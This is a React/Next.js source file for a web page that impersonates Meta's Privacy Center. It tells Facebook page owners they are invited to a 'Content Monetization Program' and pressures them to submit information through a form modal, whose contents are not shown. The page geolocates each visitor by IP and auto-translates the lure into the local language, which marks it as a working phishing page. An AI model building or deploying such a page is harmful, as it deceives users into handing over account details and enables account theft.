'use client';
import BackgroundImage from '@/assets/images/bg-image.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faArrowUpRightFromSquare } from '@fortawesome/free-solid-svg-icons/faArrowUpRightFromSquare';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

const menuItems: MenuItem[] = [
    {
        id: 'home',
        icon: faHouse,
        label: 'Privacy Center Home Page',
        isActive: true
    },
    {
        id: 'search',
        icon: faMagnifyingGlass,
        label: 'Search'
    },
    {
        id: 'privacy',
        icon: faLock,
        label: 'Privacy Policy'
    },
    {
        id: 'rules',
        icon: faCircleInfo,
        label: 'Other rules and articles'
    },
    {
        id: 'settings',
        icon: faGear,
        label: 'Settings'
    }
];

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingRef = useRef(false);

    const getCurrentDateFormatted = (): string => {
        const now = new Date();
        const day = now.getDate();
        const month = now.getMonth() + 1;
        const year = now.getFullYear();
        return `Ngày ${day} tháng ${month} năm ${year}`;
    };

    const [currentDate] = useState<string>(getCurrentDateFormatted());

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Facebook Content Monetization Program', 'Your Page has been invited to participate in the', 'This invitation gives you access to exclusive tools like In-stream ads, Ads on Reels, and Performance Bonus programs into one, making it easier for creators to earn from more content formats.', "If you're ready to take advantage of these creator benefits, you can submit your participation request.", 'Important Notes', 'Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.', 'Our verification team may reach out within 2 business days if additional details are needed.', 'Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.', 'Participation Request', 'Confirming your eligibility to join the program', 'Please make sure to provide the required information below. If we do not receive a response, the monetization feature for your Page may not be re-enabled in the future.', 'Join Facebook Monetization Program', 'You have been invited to join the Facebook Content Monetization Program on', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Cards with information about the operation of AI systems', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo, translations]);

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Account Centre</title>
            <div className='flex w-full max-w-[1100px]'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{t(item.label)}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center justify-between sm:hidden'>
                        <Image src={MetaImage} alt='' className='h-4 w-auto' />
                    </div>
                    <div className='flex items-center gap-2'>
                        <p className='text-2xl font-bold'>{t('Facebook Content Monetization Program')}</p>
                    </div>
                    <p>
                        {t('Your Page has been invited to participate in the')} <span className='cursor-pointer text-blue-600'>{t('Facebook Content Monetization Program')}</span>. {t('This invitation gives you access to exclusive tools like In-stream ads, Ads on Reels, and Performance Bonus programs into one, making it easier for creators to earn from more content formats.')}
                    </p>
                    <p>{t("If you're ready to take advantage of these creator benefits, you can submit your participation request.")}</p>
                    <p className='text-[15px] font-bold'>{t('Important Notes')}</p>
                    <ul className='list-inside list-disc text-[15px]'>
                        <li>{t('Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.')}</li>
                        <li>{t('Our verification team may reach out within 2 business days if additional details are needed.')}</li>
                        <li>{t('Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.')}</li>
                    </ul>
                    <div className='rounded-[20px] bg-linear-to-b from-[#1877F2] to-[#E4F0FF]'>
                        <Image src={BackgroundImage} alt='' className='py-10' />
                        <div className='flex flex-col items-center justify-center gap-5 p-5'>
                            <div className='rounded-[20px] bg-white p-4'>
                                <p className='text-[15px]'>{t('Participation Request')}</p>
                                <p className='text-[15px] font-bold'>{t('Confirming your eligibility to join the program')}</p>
                                <p className='text-[15px]'>{t('Please make sure to provide the required information below. If we do not receive a response, the monetization feature for your Page may not be re-enabled in the future.')}</p>
                            </div>
                            <button
                                onClick={() => {
                                    setModalKey((prev) => prev + 1);
                                    setModalOpen(true);
                                }}
                                className='flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {t('Join Facebook Monetization Program')}
                            </button>
                            <p className='inline-flex w-full gap-1 text-[14px]'>
                                {t('You have been invited to join the Facebook Content Monetization Program on')} <span className='font-bold'>{currentDate}</span>
                            </p>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
                            <div className='flex cursor-pointer items-center justify-center gap-3 rounded-t-[15px] border-b border-b-gray-200 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef]'>
                                <Image src={ProfileImage} alt='' className='h-12 w-12' />
                                <div className='flex flex-1 flex-col'>
                                    <p className='font-medium'>{t('What is the Privacy Policy and what does it say?')}</p>
                                    <p className='text-[#465a69]'>{t('Privacy Policy')}</p>
                                </div>
                                <FontAwesomeIcon icon={faChevronRight} />
                            </div>
                            <div className='flex cursor-pointer items-center justify-center gap-3 rounded-b-[15px] bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef]'>
                                <Image src={ProfileImage} alt='' className='h-12 w-12' />
                                <div className='flex flex-1 flex-col'>
                                    <p className='font-medium'>{t('How you can manage or delete your information')}</p>
                                    <p className='text-[#465a69]'>{t('Privacy Policy')}</p>
                                </div>
                                <FontAwesomeIcon icon={faChevronRight} />
                            </div>
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('For more details, see the User Agreement')}</p>
                            <div className='flex cursor-pointer items-center justify-center gap-3 rounded-[15px] bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef]'>
                                <Image src={MetaAI} alt='' className='h-12 w-12' />
                                <div className='flex flex-1 flex-col'>
                                    <p className='font-medium'>{t('Meta AI')}</p>
                                    <p className='text-[#465a69]'>{t('User Agreement')}</p>
                                </div>
                                <FontAwesomeIcon icon={faChevronRight} />
                            </div>
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
                            <div className='flex cursor-pointer items-center justify-center gap-3 rounded-t-[15px] border-b border-b-gray-200 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef]'>
                                <div className='flex flex-1 flex-col'>
                                    <p className='font-medium'>{t('How Meta uses information for generative AI models')}</p>
                                    <p className='text-[#465a69]'>{t('Privacy Center')}</p>
                                </div>
                                <FontAwesomeIcon icon={faChevronRight} />
                            </div>
                            <div className='flex cursor-pointer items-center justify-center gap-3 border-y border-y-gray-200 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef]'>
                                <div className='flex flex-1 flex-col'>
                                    <p className='font-medium'>{t('Cards with information about the operation of AI systems')}</p>
                                    <p className='text-[#465a69]'>{t('Meta AI website')}</p>
                                </div>
                                <FontAwesomeIcon icon={faChevronRight} />
                            </div>
                            <div className='flex cursor-pointer items-center justify-center gap-3 rounded-b-[15px] bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef]'>
                                <div className='flex flex-1 flex-col'>
                                    <p className='font-medium'>{t('Introduction to Generative AI')}</p>
                                    <p className='text-[#465a69]'>{t('For teenagers')}</p>
                                </div>
                                <FontAwesomeIcon icon={faChevronRight} />
                            </div>
                        </div>
                        <p className='text-[15px] text-[#465a69]'>
                            {t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about')}
                            <span className='ml-2 cursor-pointer text-blue-600 underline hover:text-blue-700'>{t('Privacy Policy')}</span>
                            <FontAwesomeIcon icon={faArrowUpRightFromSquare} className='ml-1 h-3 w-3 text-blue-600' />
                        </p>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
